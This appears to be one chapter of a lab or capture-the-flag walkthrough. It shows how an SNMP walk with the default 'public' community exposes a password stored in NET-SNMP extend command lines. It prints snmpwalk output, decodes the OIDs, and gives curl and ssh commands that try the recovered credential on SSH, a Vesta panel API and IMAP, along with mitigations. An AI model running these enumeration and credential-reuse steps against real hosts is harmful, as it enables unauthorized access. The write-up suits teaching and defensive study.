# 03 — SNMP: the host publishes its own password

`161/udp` answered to `public`. That gives unauthenticated read access to the MIB tree. On a Linux
host with `net-snmp`, one subtree in that tree stores the **command lines** the daemon is configured
to run — arguments included.

---

## 3.1 Where to look: the extend subtree

NET-SNMP's `extend` directive lets an administrator expose arbitrary command output as an OID. The
daemon keeps three views of it:

| OID | Table | Holds |
|---|---|---|
| `1.3.6.1.4.1.8072.1.3.2.2` | `nsExtendConfigTable` | command + **arguments** the daemon will execute |
| `1.3.6.1.4.1.8072.1.3.2.3` | `nsExtendOutputFullTable` | stdout of the last run |
| `1.3.6.1.4.1.8072.1.3.2.4` | `nsExtendConfigPersistTable` | persisted config |

`nsExtendOutputFull` is the one everybody remembers, because it is human-readable. On this box the
**config** table was the one that mattered — it holds the argument list, and the argument list
contained a password.

## 3.2 Walk it

```bash
snmpwalk -v1 -c public 192.168.161.156 1.3.6.1.4.1.8072.1.3.2
```

```text
iso.3.6.1.4.1.8072.1.3.2.1.0 = INTEGER: 2

# nsExtendConfigTable — what the daemon runs
iso.3.6.1.4.1.8072.1.3.2.2.1.2.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = STRING: "/bin/sh"
iso.3.6.1.4.1.8072.1.3.2.2.1.3.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = STRING: "-c \"echo \\\"jack:3PUKsX98BMupBiCf\\\" | chpasswd\""

iso.3.6.1.4.1.8072.1.3.2.2.1.2.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = STRING: "/bin/echo"
iso.3.6.1.4.1.8072.1.3.2.2.1.3.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = STRING: "\"\\\"jack:3PUKsX98BMupBiCf\\\" | chpasswd\""

# nsExtendOutputFullTable — what it printed
iso.3.6.1.4.1.8072.1.3.2.3.1.1.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = STRING: "Changing password for jack."
iso.3.6.1.4.1.8072.1.3.2.3.1.2.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = STRING: "\"jack:3PUKsX98BMupBiCf\" | chpasswd"

# nsExtendConfigPersistTable — the cleanest copy
iso.3.6.1.4.1.8072.1.3.2.4.1.2.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100.1 = STRING: "\"jack:3PUKsX98BMupBiCf\" | chpasswd"
```

## 3.3 Reading the OIDs

The ugly numeric indices are not random. An `extend` entry's OID is
`<column>.<len>.<ascii byte>...` — the **length** of the entry name, then its characters as decimal
ASCII.

```text
14 . 114.101.115.101.116.45.112.97.115.115.119.111.114.100
│     r   e   s   e   t   -   p   a   s   s   w   o   r   d
└ 14 characters
```

So `.14.…` is the extend named **`reset-password`**, and `.18.…` is **`reset-password-cmd`**:

```text
18 . 114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100
     r   e   s   e   t   -   p   a   s   s   w   o   r   d   -   c   m   d
```

That is not just cosmetic — it tells you the two entries are a **pair**, and that the admin's intent
was "reset the password, and here is the command that does it". Which is exactly what the string
says:

```text
"/bin/sh"  -c  "echo \"jack:3PUKsX98BMupBiCf\" | chpasswd"
```

Decoded: run `/bin/sh -c`, echo `jack:3PUKsX98BMupBiCf` into `chpasswd`. `chpasswd` reads
`user:password` pairs from stdin and applies them.

**The credential is `jack` : `3PUKsX98BMupBiCf`.** Not a guess, not a crack — published by the host,
in cleartext, to anyone who sends a UDP packet.

## 3.4 The output table confirms it

`nsExtendOutputFull` for the entry returns:

```text
"Changing password for jack."
```

`chpasswd` prints `Changing password for <user>.` on success and nothing on failure. So this is not
merely a configured command — **it had been executed successfully**, and the daemon kept the output
for us. Two independent OIDs, same secret.

## 3.5 Why this happens

`/etc/snmp/snmpd.conf` usually gets an entry like:

```text
extend reset-password /bin/sh -c "echo \"jack:3PUKsX98BMupBiCf\" | chpasswd"
```

It is a legitimate provisioning or monitoring hook: some dashboard pings the OID to force a known
password, and reads the result back. The mistake is structural rather than accidental —

1. the community string is the default `public`, so the table is world-readable;
2. the secret is passed as a **command-line argument**, and command lines are stored in the MIB;
3. SNMPv1 has no per-user authentication, so there is no second gate.

Two mitigations, either of which breaks the chain: a non-default community with an ACL, or passing
the password by stdin/file instead of argv. The install had neither.

## 3.6 Verify the credential before you build on it

Vesta panel users are **system users**, so one credential can work in several places. Check the
cheap ones first — a `200` here replaces an entire exploit chain.

```bash
# SSH: is jack a login account?
ssh jack@192.168.161.156

# panel API: fetch a CSRF token, then authenticate
TOK=$(curl -sk https://192.168.161.156:8083/api/v1/login/session.php | grep -oE '"token":"[a-f0-9]+"' | cut -d'"' -f4)
curl -sk -o /dev/null -w 'login: %{http_code}\n' \
  -d "user=jack&password=3PUKsX98BMupBiCf&token=$TOK" \
  https://192.168.161.156:8083/api/v1/login/index.php

# mail: Dovecot / Roundcube use the same system account
curl -s --url 'imap://192.168.161.156/' -u 'jack:3PUKsX98BMupBiCf' -v 2>&1 | grep -iE 'OK|NO|Login'
```

The panel API does **not** use HTTP basic auth — it is session-based with a CSRF token, which is why
the token fetch comes first.

On this box the panel was the way in — chapter 04. Note what is *not* true: this is a **regular
panel user**, not an administrator. The escalation in chapter 06 is reached from that unprivileged
account, which is why the box is worth writing up.
